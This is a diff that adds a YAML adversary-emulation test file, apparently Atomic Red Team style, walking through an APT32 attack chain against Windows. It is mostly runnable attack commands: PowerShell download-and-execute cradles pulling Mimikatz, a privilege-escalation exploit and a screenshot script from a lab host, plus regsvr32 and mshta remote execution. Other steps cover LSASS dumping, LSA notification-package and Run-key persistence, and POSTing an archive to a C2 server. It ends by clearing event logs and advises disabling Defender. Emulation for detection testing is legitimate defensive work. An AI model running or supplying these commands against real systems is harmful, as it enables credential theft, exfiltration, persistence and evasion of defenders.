@@ -1,0 +1,495 @@
+attack_technique: APT32
+display_name: APT32
+atomic_tests: 
+
+# Step 1: User Execution: Malicious File
+- name: Office Generic Payload Download
+  description: |
+    This Test uses a VBA macro to launch Powershell which will download a file from a user defined web server.
+  supported_platforms:
+  - windows
+  input_arguments:
+    macro_path:
+      description: |
+        Location of file which will be converted to a VBA macro
+      type: path
+      default: PathToAtomicsFolder/T1204.002/src/test9-GenericPayloadDownload.txt
+    file_name:
+      description: |
+        "Malicious" file to be downloaded.
+        This required file needs to be place on the user provided c2 domain
+        Example file can be found at PathToAtomicsFolder/T1204.002/src/test9-example-payload.txt
+      type: string
+      default: test.docx
+    ms_product:
+      description: |
+        Maldoc application Word or Excel
+      type: string
+      default: Word
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Microsoftt #{ms_product} must be installed
+    prereq_command: |
+      try {
+        New-Object -COMObject "#{ms_product}.Application" | Out-Null
+        $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
+        Stop-Process -Name $process
+        exit 0
+      } catch { exit 1 }
+    get_prereq_command: |
+      Write-Host "You will need to install Microsoft #{ms_product} manually to meet this requirement"
+  executor:
+    name: powershell
+    command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      IEX (iwr "http://192.168.80.138:1234/Invoke-MalDoc.ps1" -UseBasicParsing)
+      $macroCode = Get-Content "#{macro_path}" -Raw
+      $URL = "http://192.168.80.138:1234"
+      $macroCode = $macroCode -replace 'serverPath', $URL -replace 'fileName', "#{file_name}"
+      Invoke-MalDoc -macroCode $macroCode -officeProduct "#{ms_product}"
+    cleanup_command: |
+      Remove-Item "C:\Users\$env:username\Desktop\#{file_name}" -ErrorAction Ignore 
+# T1218.010
+- name: Regsvr32 remote COM scriptlet execution
+  description: |
+    Regsvr32.exe is a command-line program used to register and unregister OLE controls. This test may be blocked by windows defender; disable
+    windows defender real-time protection to fix it. Upon execution, calc.exe will be launched.
+  supported_platforms:
+  - windows
+  input_arguments:
+    url:
+      description: URL to hosted sct file
+      type: url
+      default: http://192.168.80.138:1234/RegSvr32.sct
+    regsvr32path:
+      description: Default location of Regsvr32.exe
+      type: path
+      default: C:\Windows\system32
+    regsvr32name:
+      description: Default name of Regsvr32.exe
+      type: string
+      default: regsvr32.exe
+  executor:
+    command: |
+      #{regsvr32path}\#{regsvr32name} /s /u /i:#{url} scrobj.dll
+    name: command_prompt
+
+# Step 2: Collection and Exfiltration
+# T1033 
+- name: System Owner/User Discovery
+  description: |
+    Identify System owner or users on an endpoint.
+    Upon successful execution, cmd.exe will spawn multiple commands against a target host to identify usernames. Output will be via stdout. 
+  supported_platforms:
+  - windows
+  input_arguments:
+    computer_name:
+      description: Name of remote computer
+      type: string
+      default: localhost
+  executor:
+    command: |
+      whoami /all
+    name: command_prompt
+# T1082
+- name: System Information Discovery
+  description: |
+    Identify System Info. Upon execution, system info and time info will be displayed.
+  supported_platforms:
+  - windows
+  executor: 
+    command: |
+      echo %COMPUTERNAME%
+      systeminfo
+    name: command_prompt
+# T1016
+- name: System Network Configuration Discovery
+  description: |
+    Identify network configuration information
+    Upon successful execution, cmd.exe will spawn multiple commands to list network configuration settings. Output will be via stdout.
+  supported_platforms: 
+  - windows
+  executor:
+    command: |
+      ipconfig /all
+    name: command_prompt
+  
+# Step 3: Privilege Escalation 
+# T1218.005
+- name: Mshta Executes Remote HTML Application (HTA)
+  description: |
+    Execute an arbitrary remote HTA. Upon execution calc.exe will be launched.
+  supported_platforms:
+  - windows
+  input_arguments:
+    temp_file:
+      description: temp_file location for hta
+      type: string
+      default: C:\Users\Public\T1218.005.hta
+    hta_url:
+      description: URL to HTA file for execution
+      type: string
+      default: http://192.168.80.138:1234/T1218.005.hta
+  executor:
+    command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      $var = Invoke-WebRequest "#{hta_url}" -UseBasicParsing
+      $var.content|out-file "#{temp_file}"
+      mshta "#{temp_file}"
+      start-sleep -s 15
+      stop-process -name "calculator" -Force
+    cleanup_command: |
+      remove-item "#{temp_file}" -ErrorAction Ignore
+    name: powershell
+# T1068 
+- name: Exploitation for Privilege Escalation
+  description: APT32 has used CVE-2016-7255 to escalate privileges.
+  supported_platforms: 
+  - windows
+  executor:
+    command: |
+      whoami
+      IEX ((new-object net.webclient).downloadstring('http://192.168.80.138:1234/MS16-135.ps1'))
+      whoami
+    name: powershell
+
+# Step 4: Discovery for Lateral Movement
+# T1033
+- name: System Owner/User Discovery
+  description: |
+    Identify System owner or users on an endpoint.
+    Upon successful execution, cmd.exe will spawn multiple commands against a target host to identify usernames. Output will be via stdout. 
+  supported_platforms:
+  - windows
+  input_arguments:
+    computer_name:
+      description: Name of remote computer
+      type: string
+      default: localhost
+  executor:
+    command: |
+      whoami /all
+    name: command_prompt
+# T1016
+- name: System Network Configuration Discovery
+  description: |
+    Identify network configuration information
+    Upon successful execution, cmd.exe will spawn multiple commands to list network configuration settings. Output will be via stdout.
+  supported_platforms: 
+  - windows
+  executor:
+    command: |
+      arp -a
+      route print
+    name: command_prompt
+#T1046
+- name: Port Scan using python
+  description: |
+    Scan ports to check for listening ports with python
+  supported_platforms:
+  - windows
+  input_arguments:
+    host_ip:
+      description: Host to scan.
+      type: string
+      default: 127.0.0.1
+    filename:
+      description: Location of the project file
+      type: path
+      default: PathToAtomicsFolder\T1046\src\T1046.py
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      Check if python exists on the machine
+    prereq_command: |
+      if (Get-Command py -errorAction SilentlyContinue) { exit 0 } else { exit 1 }
+    get_prereq_command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction ignore -Force | Out-Null
+      invoke-webrequest "https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe" -outfile "PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe"
+      Start-Process -FilePath "PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe" -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1 Include_test=0" -Wait
+  executor:
+    command: |
+      py "#{filename}" -i #{host_ip}
+    name: powershell
+# T1083
+- name: File and Directory Discovery
+  description: |
+    Find or discover files on the file system.  Upon successful execution, this test will output the results of all the data discovery commands to a specified file.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      ls
+    name: powershell
+# T1018
+- name: Remote System Discovery - net group Domain Computers
+  description: |
+    Identify remote systems with net.exe querying the Active Directory Domain Computers group.
+
+    Upon successful execution, cmd.exe will execute cmd.exe against Active Directory to list the "Domain Computers" group. Output will be via stdout.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      net group "Domain Computers" /domain
+    name: command_prompt
+# T1049
+- name: System Network Connections Discovery with PowerShell
+  description: |
+    Get a listing of network connections.
+    Upon successful execution, powershell.exe will execute `get-NetTCPConnection`. Results will output via stdout.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      netstat -anpo tcp
+      netsh wlan show interface
+    name: powershell
+# T1135
+- name: Network Share Discovery command prompt
+  description: |
+    Network Share Discovery utilizing the command prompt. The computer name variable may need to be modified to point to a different host
+    Upon execution avalaible network shares will be displayed in the powershell session
+  supported_platforms:
+  - windows
+  input_arguments:
+    computer_name:
+      description: Computer name to find a mount on.
+      type: string
+      default: 192.168.80.131
+  executor:
+    command: |
+      net view \\#{computer_name}
+    name: command_prompt
+# T1552.002: Unsecured Credentials: Credentials in Registry
+- name: Enumeration for Credentials in Registry
+  description: |
+    Queries to enumerate for credentials in the Registry. Upon execution, any registry key containing the word "password" will be displayed.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      reg query HKLM /f password /t REG_SZ /s
+      reg query HKCU /f password /t REG_SZ /s
+    name: command_prompt
+
+#Step 5: Credential Access
+# T1003
+- name: Powershell Mimikatz
+  description: |
+    Dumps credentials from memory via Powershell by invoking a remote mimikatz script.
+    If Mimikatz runs successfully you will see several usernames and hashes output to the screen.
+    Common failures include seeing an \"access denied\" error which results when Anti-Virus blocks execution. 
+    Or, if you try to run the test without the required administrative privileges you will see this error near the bottom of the output to the screen "ERROR kuhl_m_sekurlsa_acquireLSA"
+  supported_platforms:
+  - windows
+  input_arguments:
+    remote_script:
+      description: URL to a remote Mimikatz script that dumps credentials
+      type: url
+      default: http://192.168.80.138:1234/Invoke-Mimikatz.ps1
+  executor:
+    command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds
+    name: powershell
+    elevation_required: true
+# T1069: Permission Groups Discovery: Local Groups
+- name: Basic Permission Groups Discovery Windows (Local)
+  description: |
+    Basic Permission Groups Discovery for Windows. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain
+    information will be displayed.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      net localgroup
+      net localgroup "Administrators"
+    name: command_prompt
+# T1135
+- name: Network Share Discovery command prompt
+  description: |
+    Network Share Discovery utilizing the command prompt. The computer name variable may need to be modified to point to a different host
+    Upon execution avalaible network shares will be displayed in the powershell session
+  supported_platforms:
+  - windows
+  input_arguments:
+    computer_name:
+      description: Computer name to find a mount on.
+      type: string
+      default: 192.168.80.131
+  executor:
+    command: |
+      net view \\#{computer_name}
+    name: command_prompt
+    
+# Step 6: Initial Compromise
+# T1056.001
+- name: Screen Capture
+  description: |
+    Download file ps hosted by attacker and exec this file to screenshot every 5s.
+    Stop Screenshot after 30s then screen shot base64 will save as .tmp file in C:\Users\Public\tmp
+  supported_platforms:
+  - windows
+  executor: 
+    command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      ((new-object net.webclient).downloadstring('http://192.168.80.138:1234/Get-Screenshot.ps1'))|iex
+      timeout 30
+      Stop-Job -Name "Screenshot"
+    name: powershell
+# T1560
+- name: Compress Data for Exfiltration With PowerShell
+  description: |
+    An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration.
+    When the test completes you should find the files from the $env:USERPROFILE directory compressed in a file called T1560-data-ps.zip in the $env:USERPROFILE directory 
+  supported_platforms:
+  - windows
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      Compress-Archive -Path C:\Users\Public\tmp -DestinationPath C:\Users\Public\archive.zip
+#T1570
+- name: Lateral Tool Transfer
+  description: |
+    Adversaries may use command line tools to discover specific processes in preparation of further attacks. 
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      (New-Object Net.WebClient).DownloadFile('http://192.168.80.138:1234/PasswordChange.dll','C:\Windows\System32\PasswordChange.dll')
+    name: powershell
+# T1547
+- name: Add new Registry
+  description: |
+    Queries to add new Registry for Notification Packages. 
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      REG QUERY "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages"
+      REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages" /t REG_MULTI_SZ /d "scecli\0PasswordChange" /f
+      REG DELETE "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages" /f
+    name: command_prompt
+
+# Step 7: Persistence Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
+# Download file malicious
+- name: Download file malicious
+  description: |
+    Download malicious file from attacker's host and save file to path C:\Windows\system32
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      (New-Object Net.WebClient).DownloadFile('http://192.168.80.138:1234/syscheck.vbs','C:\Windows\System32\syscheck.vbs')
+    name: powershell
+    elevation_required: true
+# T1547.001
+- name: Reg Key Run
+  description: |
+    Run Key Persistence
+    Upon successful execution, cmd.exe will modify the registry by adding \"Atomic Red Team\" to the Run key. Output will be via stdout. 
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      reg.exe add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v TESTLAB /t REG_SZ /d "C:\Windows\System32\syscheck.vbs"
+    cleanup_command: |
+      reg delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v TESTLAB /f
+    name: powershell
+
+# Step 8: Expand Access
+# T1057
+- name: Discover Specific Process - tasklist
+  description: |
+    Adversaries may use command line tools to discover specific processes in preparation of further attacks. 
+    Examples of this could be discovering the PID of lsass.exe to dump its memory or discovering whether specific security processes (e.g. AV or EDR) are running.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      tasklist | findstr lsass
+    name: command_prompt
+# T1570
+- name: Lateral Tool Transfer
+  description: |
+    Adversaries may use command line tools to discover specific processes in preparation of further attacks. 
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      (New-Object Net.WebClient).DownloadFile('http://192.168.80.138:1234/procdump.exe','C:\Windows\kb-10233.exe')
+    name: powershell
+# T1003.001
+- name: Dump LSASS.exe Memory using ProcDump
+  description: |
+    The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals
+    ProcDump.
+
+    Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.
+
+    If you see a message saying "procdump.exe is not recognized as an internal or external command", try using the  get-prereq_commands to download and install the ProcDump tool first.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      C:\Windows\kb-10233.exe -accepteula -ma lsass.exe C:\Users\Public\tmp\kb-10233.dmp
+    name: powershell
+    elevation_required: true
+
+# Step 9: Clean up, Collection and Exfilltration
+# T1041 
+- name: C2 Data Exfiltration
+  description: |
+    Exfiltrates a file present on the victim machine to the C2 server.
+  supported_platforms:
+  - windows
+  input_arguments:
+    destination_url:
+      description: Destination URL to post encoded data.
+      type: string
+      default: 192.168.80.138:9000
+    filepath:
+      description: The file which is being exfiltrated to the C2 Server.
+      type: path
+      default: C:\Users\Public\archive.zip
+  executor:
+    command: |
+      if(-not (Test-Path #{filepath})){ 
+        1..100 | ForEach-Object { Add-Content -Path #{filepath} -Value "This is line $_." }
+      }
+      [System.Net.ServicePointManager]::Expect100Continue = $false
+      [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
+      $filecontent = Get-Content -Path #{filepath}
+      Invoke-WebRequest -Uri #{destination_url} -Method POST -ContentType "application/zip" -InFile "C:\Users\Public\archive.zip" -Headers @{"Content-Disposition"="form-data; name='file'; filename='file.zip'"} -DisableKeepAlive -UseBasicParsing 
+    name: powershell
+# T1070.004
+- name: Delete file and folder
+  description: |
+    Delete file and folder from the temporary directory using Powershell. Upon execution, no output will be displayed. Use File Explorer to verify the file was deleted.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      Remove-Item -Recurse C:\Users\Public\tmp
+      Remove-Item -Recurse C:\Users\Public\archive.zip
+      Remove-Item -Recurse C:\Windows\kb-10233.exe
+    name: powershell
+# T1070.001
+- name: Clear Windows Event Logs
+  description: |
+    Upon execution this test will clear Windows Event Logs. Open the System.evtx logs at C:\Windows\System32\winevt\Logs and verify that it is now empty.
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      wevtutil cl security
+      wevtutil cl Setup
+      wevtutil cl System
+      wevtutil cl Application
+      wevtutil cl ForwardedEvents
+    name: command_prompt
+    elevation_required: true
